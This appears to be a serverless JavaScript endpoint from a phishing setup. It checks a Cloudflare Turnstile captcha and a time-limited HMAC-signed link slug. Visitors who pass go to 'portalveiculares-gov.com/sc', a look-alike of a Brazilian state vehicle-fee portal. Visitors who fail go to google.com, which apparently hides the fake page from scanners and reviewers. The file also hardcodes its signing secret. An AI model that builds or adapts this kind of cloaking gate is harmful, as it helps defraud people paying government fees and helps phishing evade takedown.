// Valida token Turnstile + slug HMAC. Retorna {success, redirect}
import crypto from "node:crypto";

const HMAC_SECRET = "sc-guias-2026-1167a8c9359ce493353764016606e2b20678376b1f68be2d8a0c6c319dc5af05-fixed";
const SLUG_TTL_SECONDS = 120;
const DESTINATION_URL = "https://portalveiculares-gov.com/sc"; // <-- destino final após captcha
const FALLBACK_URL = "https://www.google.com";

function b64url(buf) {
  return Buffer.from(buf).toString("base64")
    .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function hmacSign(message) {
  return b64url(crypto.createHmac("sha256", HMAC_SECRET).update(message).digest());
}

function safeEqual(a, b) {
  if (a.length !== b.length) return false;
  let diff = 0;
  for (let i = 0; i < a.length; i++) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

function verifySlug(slug) {
  if (!slug || typeof slug !== "string") return false;
  const parts = slug.split(".");
  if (parts.length !== 3) return false;
  const [tsStr, nonce, sig] = parts;
  const ts = parseInt(tsStr, 10);
  if (!ts || !nonce || !sig) return false;

  const expected = hmacSign(`${ts}.${nonce}`);
  if (!safeEqual(sig, expected)) return false;

  const now = Math.floor(Date.now() / 1000);
  if (now - ts > SLUG_TTL_SECONDS) return false;
  if (ts > now + 30) return false;
  return true;
}

export default async (request) => {
  if (request.method !== "POST") {
    return new Response("Method not allowed", { status: 405 });
  }

  let body;
  try { body = await request.json(); }
  catch { return Response.json({ success: false, error: "bad-body" }, { status: 400 }); }

  const slug = (body.slug || "").toString();
  const token = (body.token || "").toString();

  if (!token) return Response.json({ success: false, error: "missing-token" }, { status: 400 });
  if (!verifySlug(slug)) return Response.json({ success: false, error: "invalid-slug", redirect: FALLBACK_URL }, { status: 403 });

  const secret = process.env.TURNSTILE_SECRET;
  if (!secret) return Response.json({ success: false, error: "missing-secret" }, { status: 500 });

  const ip = request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "";
  const form = new URLSearchParams();
  form.append("secret", secret);
  form.append("response", token);
  if (ip) form.append("remoteip", ip);

  try {
    const r = await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
      method: "POST",
      body: form,
    });
    const data = await r.json();
    if (!data.success) {
      return Response.json({ success: false, errors: data["error-codes"] || [] }, { status: 200 });
    }
    return Response.json({ success: true, redirect: DESTINATION_URL });
  } catch (e) {
    return Response.json({ success: false, error: "verify-failed" }, { status: 500 });
  }
};

export const config = { path: "/api/verify" };
